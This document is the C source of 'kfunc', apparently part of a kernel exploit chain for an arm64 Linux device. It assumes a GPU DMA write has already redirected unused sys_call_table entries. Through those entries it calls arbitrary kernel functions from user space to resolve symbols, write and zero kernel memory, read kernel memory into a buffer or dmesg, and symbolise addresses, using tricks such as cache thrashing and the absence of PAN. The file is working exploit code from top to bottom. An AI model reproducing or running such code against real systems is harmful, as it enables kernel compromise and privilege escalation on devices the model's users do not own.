/*
 * kfunc - call an arbitrary kernel function from a 64-bit process by abusing
 *         unused entries of sys_call_table.
 *
 * Background
 * ----------
 * The kernel on the target is arm64, so sys_call_table[] holds 8-byte
 * pointers.  Entries [244..259] are all sys_ni_syscall ("not implemented"),
 * i.e. 16 consecutive slots nobody calls.  One 128-byte write from
 * gpu_arb_write() fills all 16 of them with the same address, and the kernel
 * then happily dispatches our syscall number into that function.
 *
 * Because the syscall ABI passes arguments in x0..x5 and returns x0, the
 * called function sees our arguments and we get its return value back.  There
 * is no PAN on this target, so the kernel can also read strings and buffers
 * that live in our address space.
 *
 * Note: a *32-bit* process does NOT go through this table - it goes through
 * compat_sys_call_table, which lives in .text.  That is why this helper must
 * be a 64-bit (aarch64) binary.
 *
 * Build (64-bit ARM, static):
 *   aarch64-linux-musl-gcc -O1 -static -o kfunc kfunc.c
 *
 * Modes (the table entry must already point at the matching function):
 *   kfunc sym  <name>            kallsyms_lookup_name(name)   -> prints address
 *   kfunc zero <addr_hex> <len>  memcpy(addr, zeros, len)
 *   kfunc str  <addr_hex> <text> memcpy(addr, text, len+1)
 *   kfunc show <addr_hex> <len>  memcpy(buf, addr, len)       -> hexdump
 *   kfunc dump <addr_hex> <len>  kernel read into dmesg via warn_slowpath_fmt
 *   kfunc call <nr> [arg]        raw syscall, to probe a slot
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <unistd.h>

#define SLOT 244

/* sys_call_table is read on every syscall, so its cache line stays hot and a
 * GPU (DMA) write to the table is invisible until that line is evicted.  Walk
 * a few MB of memory right before the call so the CPU reloads the entry from
 * RAM and picks up what gpu_arb_write/gpwrite put there. */
static void cache_thrash(void)
{
    static unsigned char *buf;
    const size_t len = 8u << 20;
    if (!buf) {
        buf = mmap(NULL, len, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (buf == MAP_FAILED) { buf = NULL; return; }
        memset(buf, 1, len);
    }
    for (size_t i = 0; i < len; i += 64)
        buf[i] ^= 0x5a;
}

static unsigned char buf[8192];
static unsigned char src[8192];

static unsigned long call3(unsigned long a0, unsigned long a1, unsigned long a2)
{
    cache_thrash();
    return (unsigned long)syscall(SLOT, a0, a1, a2);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 2) {
        fprintf(stderr, "usage: see source header\n");
        return 1;
    }

    if (!strcmp(argv[1], "sym") && argc >= 3) {
        char name[128];
        strncpy(name, argv[2], sizeof name - 1);
        name[sizeof name - 1] = 0;
        unsigned long a = call3((unsigned long)name, 0, 0);
        printf("%s = 0x%016lx\n", name, a);
        return (a > 0xffffff0000000000UL) ? 0 : 2;
    }

    if (!strcmp(argv[1], "zero") && argc >= 4) {
        unsigned long dst = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > (int)sizeof src) return 1;
        memset(src, 0, len);
        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
        printf("memset-ish 0x%lx <- 0 (%d bytes), ret=0x%lx\n", dst, len, r);
        return 0;
    }

    if (!strcmp(argv[1], "str") && argc >= 4) {
        unsigned long dst = strtoul(argv[2], NULL, 16);
        int len = (int)strlen(argv[3]) + 1;
        if (len > (int)sizeof src) return 1;
        memcpy(src, argv[3], len);
        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
        printf("memcpy 0x%lx <- \"%s\" (%d bytes), ret=0x%lx\n", dst, argv[3], len, r);
        return 0;
    }

    if (!strcmp(argv[1], "show") && argc >= 4) {
        unsigned long src_addr = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > (int)sizeof buf) return 1;
        memset(buf, 0, sizeof buf);
        call3((unsigned long)buf, src_addr, (unsigned long)len);
        for (int i = 0; i < len; i++) {
            printf("%02x", buf[i]);
            if ((i & 15) == 15) printf("\n");
        }
        if (len & 15) printf("\n");
        return 0;
    }

    /* Symbolisation oracle: call dump_backtrace(regs, NULL) with a fabricated
     * pt_regs living in our own address space.  dump_backtrace() reads
     * regs->regs[29], regs->sp and regs->pc straight out of user memory (no
     * PAN on this SoC), prints "Call trace:", then emits
     *
     *     [<pc>] symbol+offset/size
     *
     * through %pS.  Because the frame pointer we hand it points at our own
     * buffer, exactly one frame is printed and the walk stops before touching
     * anything else.  Nothing is executed at `pc`, so this can be pointed at
     * any kernel address safely: it is a read-only "what symbol is at this
     * address" query. */
    if (!strcmp(argv[1], "bt") && argc >= 3) {
        unsigned long pc = strtoul(argv[2], NULL, 16);
        static unsigned long frame[64] __attribute__((aligned(16384)));
        unsigned long regs[33];

        memset(regs, 0, sizeof regs);
        frame[0] = 0; /* next fp = 0 -> unwind fails, walk stops after 1 frame */
        frame[1] = 0;
        /* sp must not be 16K aligned: unwind_frame() computes
         * high = ALIGN(sp, THREAD_SIZE) and rejects fp when
         * fp > high - 0x18, which is always the case for fp == sp == 16K base. */
        regs[29] = (unsigned long)(frame + 32); /* fp  (+256, 16-aligned) */
        regs[31] = (unsigned long)(frame + 32); /* sp  (+256) */
        regs[32] = pc;                          /* pc */

        unsigned long r = (unsigned long)syscall(SLOT, (unsigned long)regs, 0UL, 0UL);
        printf("bt pc=0x%lx ret=0x%lx\n", pc, r);
        return 0;
    }

    /* Arbitrary kernel read via warn_slowpath_fmt() + "%*ph".
     *
     * With the slot pointing at warn_slowpath_fmt(file, line, fmt, ...) we
     * pass file = line = 0 so the caller is reported as "(null)", then a
     * format string "*ph" (sic, the leading '*' is the width spec) that
     * vprintk() expands from our own user buffer.  No PAN on this SoC, so
     * vprintk() can read the format string straight out of our address
     * space.  The dump lands in dmesg as space-separated hex bytes.
     *
     * 3.14 caps %*ph at 64 bytes. */
    if (!strcmp(argv[1], "dump") && argc >= 4) {
        unsigned long addr = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > 64)
            return 1;
        strcpy((char *)src, "%*ph");
        unsigned long r = (unsigned long)syscall(SLOT, 0UL, 0UL,
                                                 (unsigned long)src,
                                                 (unsigned long)len,
                                                 addr, 0UL);
        printf("dump 0x%lx len=%d ret=0x%lx\n", addr, len, r);
        return 0;
    }

    if (!strcmp(argv[1], "call") && argc >= 3) {
        unsigned long nr = strtoul(argv[2], NULL, 0);
        unsigned long a0 = (argc >= 4) ? strtoul(argv[3], NULL, 0) : 0;
        unsigned long r = (unsigned long)syscall(nr, a0, 0, 0);
        printf("nr=%lu ret=0x%lx\n", nr, r);
        return 0;
    }

    fprintf(stderr, "unknown mode\n");
    return 1;
}


